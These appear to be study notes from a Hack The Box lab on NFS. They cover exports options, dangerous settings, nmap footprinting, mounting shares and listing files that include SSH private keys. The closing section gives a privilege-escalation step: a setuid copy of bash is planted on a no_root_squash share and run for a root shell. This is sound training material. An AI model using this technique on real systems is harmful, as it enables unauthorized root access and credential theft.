
---
NFS: Network File System, has the same purpose as SMB, but use d between Linux and Unix systems.

NFS protocol version 3.0 autenticaties the client computer, this changes with NFSv4.

NFSv4: It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.

A significant advantage of NFSv4 over its predecessors is that only one UDP or TCP port `2049` is used to run the service, which simplifies the use of the protocol across firewalls.

NFS is based on the [Open Network Computing Remote Procedure Call](https://en.wikipedia.org/wiki/Sun_RPC) (`ONC-RPC`/`SUN-RPC`) protocol exposed on `TCP` and `UDP` ports `111`, which uses [External Data Representation](https://en.wikipedia.org/wiki/External_Data_Representation) (`XDR`) for the system-independent exchange of data.

The NFS protocol has `no` mechanism for `authentication` or
`authorization`. Instead, authentication is completely shifted to the RPC protocol's options. The authorization is derived from the available file system information.

The most common authentication is via UNIX `UID`/`GID` and 
`group memberships`, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to do anything further. No further checks can be made on the part of the server.

### Default Configuration
The /etc/exports file contains a table of physical filesystems on an NFS server accessible by the clients.

[NFS Exports Table](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html)

First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets.

```bash
hcx05@htb[/htb]$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported 
# to NFS clients. See exports(5). 
# 
# Example for NFSv2 and NFSv3: 
# /srv/homes hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check) 
# 
# Example for NFSv4: 
# /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check) 
# /srv/nfs4/homes gss/krb5i(rw,sync,no_subtree_check)
```
gss/frb5i: Using Kerberos authentication

#### Additional options

`ro`: Read only permissions.

`sync`: Synchronous data transfer. (A bit slower)

`async`: Asynchronous data transfer. (A bit faster)

`secure`: Ports above 1024 will not be used.

`no_subtree_check`: This option disables the checking of subdirectory trees.

`root_squash`: Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount.

#### Dangerous Settings

`rw`: Read and write permissions.

`insecure`: Ports above 1024 will be used. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.

`nohide`: If another file system was mounted below an exported directory, this directory is exported by its own exports entry.

`no_root_squash`: All files created by root are kept with the UID/GID 0.

### Footprinting NFS
TCP ports `111` and `2049`
```bash
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

#### Mounting Shares
```bash
hcx05@htb[/htb]$ showmount -e 10.129.14.128 
#-e: Display /etc/exports content that are avaliable

Export list for 10.129.14.128: 
/mnt/nfs 10.129.14.0/24
```

```bash
hcx05@htb[/htb]$ mkdir target-NFS 
hcx05@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock,soft,timeo=50,retrans=2
#-o nolock: Disable File Locking
```

#### List Contents with UIDs & GUIDs
```bash
hcx05@htb[/htb]$ ls -n mnt/nfs/ 

total 16 
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv 
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub 
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh 
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa 
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub 
-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
```
If the `root_squash` option is set, we cannot edit the 
`backup.sh` file even as `root`.

If there is `no-root_squash`
```bash
cp /bin/bash ./target-NFS/root_shell
chmod +s ./target-NFS/root_shell 
```
 Go to the mounted dir
```bash
ssh@nfs:/$ /var/nfs/root_shell -p
```

#### Unmounting
```bash
sudo umount ./target-NFS
```


















